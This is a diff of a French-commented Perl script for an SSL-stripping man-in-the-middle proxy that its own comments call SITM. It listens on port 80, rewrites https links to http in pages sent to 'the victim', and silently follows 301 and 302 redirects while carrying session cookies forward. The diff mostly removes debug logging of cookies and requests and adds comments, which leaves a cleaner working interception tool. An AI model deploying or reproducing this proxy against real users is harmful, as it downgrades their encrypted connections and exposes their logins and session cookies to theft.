@@ -4,27 +4,22 @@
 use strict;
 use warnings;
 
-use Convert::Scalar;
 use Encode;
-use HTML::Entities;
-use IO::Compress::Gzip qw(gzip $GzipError);
-use URI::Find;
-use URI::Escape;
 use URI::Encode qw(uri_encode uri_decode);
 use HTTP::Daemon;
 use LWP::UserAgent;
 use Crypt::SSLeay;
 use LWP::Protocol::https;
-my @cache_cookie=();
-my @cache;
-my $pa = LWP::UserAgent->new;
+
 my $ua = LWP::UserAgent->new(keep_alive => 5, requests_redirectable => []);
+
+#Mise en place du serveur HTTP sur le port 80
+
 my $http = HTTP::Daemon->new( 
 	LocalPort => 80, 
 	reuse => 1
 ) || die;
 print "[Proxy URL:", $http->url, "]\n";
-
 
 
 print "En attente d'un client..\n";
@@ -36,13 +31,6 @@ while (my $c = $http->accept) {
 
         while (my $request = $c->get_request) {
         	$request->uri("http://".$request->header("Host").$request->uri);
-			#my $tmp_http = $request;
-			#my $encoding_http;
-			#($tmp_http, $encoding_http) = decode_content($tmp_http);
-			#$tmp_http = replace_http($tmp_http);
-			#$tmp_http->encode($encoding_http);
-			#$request = $tmp_http;
-			#print "REQUETE TRANSFORME\n\n".$tmp_http->as_string."\n\n";
 
 			RESEND:
 			print "Envoi requete\n";
@@ -93,7 +81,8 @@ while (my $c = $http->accept) {
 			
 }
 
-
+#Décode le contenu d'un paquet en fonction de la méthode explicitée dans le header HTTP -Content-Encoding-
+#Renvoie le contenu décodé et la méthode
 sub decode_content{
 	my ($tmp) = @_;
 	my $encoding = $tmp->header("Content-Encoding");			
@@ -105,7 +94,8 @@ sub decode_content{
 	return ($tmp, $encoding);
 }
 				
-
+#Remplace tous les liens https du contenu d'un paquet HTTP en http
+#Renvoie le contenu modifié
 sub replace_https{
 	my ($tmp, $response) = @_;
 	open (MODIFIED, ">>modified.html");
@@ -117,25 +107,14 @@ sub replace_https{
 	return $tmp;
 }
 
-sub replace_http{
-	my ($tmp_http) = @_;
-	#open (MODIFIED, ">>modified.html");
-	if(${$tmp_http->content_ref} =~ /(((http:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-]*)?\??(?:[\-\+=&;%@\.\w]*)#?(?:[\.\!\/\\\w]*))?)/g){
-		print MODIFIED "$&\n";
-		${$tmp_http->content_ref} =~ s/http/https/g;
-	}
-	#close MODIFIED;
-	return $tmp_http;
-}
-
+#Constitue la réponse qui sera envoyé à la victime (header + contenu)
+#renvoie la réponse
 sub pack_response{
 
 	my ($tmp, $response, $encoding) = @_;
 
 	my $header = $response->headers;
-	open(PAPA, ">>tab.txt");
-	print PAPA $header->as_string;
-	close(PAPA);
+	
 	if($header->as_string =~ /\n/){
 		print "SUBSTITUTION DONE\n\n";
 		my $tmp_header = $header->as_string;
@@ -156,29 +135,25 @@ sub pack_response{
 	return $send;
 }
 
-
+#Si la réponse du serveur est un code 301, SITM renvoie, sans en informer la victime, la requête à l'adresse envoyée dans le header Location
+#Renvoie la nouvelle réponse transmise par le serveur
 sub redirect_301 {
 	my ($request, $response) = @_;
 	
 	print "Checking new location...\n";
 	
-	open (MODIFIED, ">>tab.txt");
 	$request->uri("");
 	$request->uri($response->header("Location"));
 	
 	print "Renvoi de la requete : 301\n";
-	print MODIFIED "URL envoyé : ".$request->uri."\n";
 	my $cookie = $response->header("Set-Cookie");
-	print MODIFIED "Cookie:\n".$cookie."\n";
+	
 	$request->push_header(Cookie => $cookie);
 
 	if($response->header("Referer")){
 		my $referer = $response->header("Referer");
 		$request->header(Referer => $referer);	
 	}	
-
-	print MODIFIED "Requete transformée : cookie\n";
-	print MODIFIED $request->as_string."\n";
 
 	if($response = $ua->request( $request )){
 		print "Requete 301 : retransmise\n";
@@ -188,43 +163,26 @@ sub redirect_301 {
 	goto CHECK_CODE;
 }
 
+#Si la réponse du serveur est un code 302, SITM renvoie, sans en informer la victime, la requête à l'adresse envoyée dans le header Location
+#Renvoie la nouvelle réponse transmise par le serveur
 sub redirect_302{
 	my ($request, $response) = @_;
 	print "Checking new location...\n";
 				
-	open (MODIFIED, ">>tab.txt");
 	$request->uri("");
-	
 	$request->uri($response->header("Location"));
-	print MODIFIED $request->uri->scheme."\n\n";
-	print MODIFIED $request->uri->host."\n\n";
-	print MODIFIED "CODE 302\n\n";
-	print MODIFIED $request->as_string."\n";
 	
 	print "Renvoi de la requete : 302\n";
-	print MODIFIED "URL envoyé : ".$request->uri."\n";
 	my $cookie = $response->header("Set-Cookie");
 	$request->push_header(Cookie => $cookie);
 
-	#if($response->header("Referer")){
-		my $referer = "https://facebook.com";#$response->header("Referer");#"https://facebook.com";#
+	if($response->header("Referer")){
+		my $referer = $response->header("Referer");
 		$request->header(Referer => $referer);
-		#print "REFERER : $referer\n";
-	#}
-		#if($referer =~ /http:/){
-		#	$referer =~ s/http/https/;
-		#}
-		#print "REFERER : $referer\n";
-	#	$request->header(Referer => $referer);			
-	#}
-	
-	
-	print MODIFIED "Requete transformée : cookie\n";
-	print MODIFIED $request->as_string."\n";
+	}
 
 	if($response = $ua->request( $request )){
 		print "Requete 302 : retransmise\n";		
-		print "COOKIE dans la boucle code : ".$response->header("Set-Cookie")."\n";
 	}
 	return $response;
 	goto CHECK_CODE;
